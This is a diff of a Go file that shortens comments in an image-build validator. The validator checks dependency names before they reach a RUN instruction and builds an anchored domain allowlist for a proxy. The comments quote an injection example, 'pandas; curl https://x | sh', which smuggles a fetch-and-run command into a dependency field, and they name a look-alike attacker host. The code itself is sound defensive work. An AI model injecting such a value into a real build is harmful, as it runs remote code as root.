@@ -9,21 +9,16 @@ import (
 	"github.com/skael-dev/skael/internal/eval/spec"
 )
 
-// ErrUnsafeDep is returned for a dependency string that could not be safely
-// placed in a RUN instruction.
+// ErrUnsafeDep is a dependency that cannot safely reach a RUN instruction.
 var ErrUnsafeDep = errors.New("imagespec: unsafe dependency")
 
-// depPattern is what an ordinary package name looks like across apt, pip and
-// npm: a name, optionally scoped or versioned. Everything a shell would treat
-// as syntax is outside it, and a leading dash is too — a dep is not a place to
-// pass "--index-url".
+// An ordinary package name across apt, pip and npm. Shell syntax is outside it,
+// and so is a leading dash — a dep is not a place to pass "--index-url".
 var depPattern = regexp.MustCompile(`^@?[A-Za-z0-9][A-Za-z0-9._+/-]*(?:(?:==|@|=)[A-Za-z0-9][A-Za-z0-9._+-]*)?$`)
 
-// ValidateDeps checks every declared dependency. These strings come from a
-// model-authored spec and are interpolated into an image build's RUN
-// instruction, which makes this a security boundary rather than a tidiness
-// check: "pandas; curl https://x | sh" would otherwise execute at build time,
-// as root, with the network on.
+// ValidateDeps is a security boundary, not a tidiness check: these strings come
+// from a model-authored spec and are interpolated into a RUN instruction, so
+// "pandas; curl https://x | sh" would execute at build time, as root.
 func ValidateDeps(d spec.DepsDecl) error {
 	for _, group := range []struct {
 		name string
@@ -44,10 +39,9 @@ func ValidateDeps(d spec.DepsDecl) error {
 	return nil
 }
 
-// domainPattern is a hostname, optionally with a leading dot for a subdomain
-// wildcard. The allowlist is the enforcement point for network policy, so a
-// value that could carry proxy-configuration syntax is rejected rather than
-// escaped.
+// A hostname, optionally dot-prefixed for a subdomain wildcard. The allowlist
+// enforces network policy, so a value carrying proxy-configuration syntax is
+// rejected rather than escaped.
 var domainPattern = regexp.MustCompile(`^\.?[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]*[A-Za-z0-9])?)+$`)
 
 // ProxyConfig renders the allowlist proxy's configuration and filter file,
@@ -72,12 +66,9 @@ func ProxyConfig(allow []string) (string, error) {
 	b.Write(conf)
 	b.WriteString("\n" + FilterMarker + "\n")
 	for _, d := range sorted(allow) {
-		// tinyproxy's filter is a regexp list; anchor each entry so
-		// "api.anthropic.com" does not also permit "api.anthropic.com.evil.example",
-		// and escape it with QuoteMeta so its literal dots stay literal dots
-		// rather than becoming "any character" — an unescaped entry would also
-		// let through a look-alike like "api-anthropic.com", which defeats a
-		// proxy whose entire job is to be default-deny.
+		// The filter is a regexp list. Anchored, so "api.anthropic.com" does not
+		// permit "api.anthropic.com.evil.example"; quoted, so its dots stay
+		// literal and do not admit "api-anthropic.com".
 		fmt.Fprintf(&b, "(^|\\.)%s$\n", regexp.QuoteMeta(strings.TrimPrefix(d, ".")))
 	}
 	return b.String(), nil
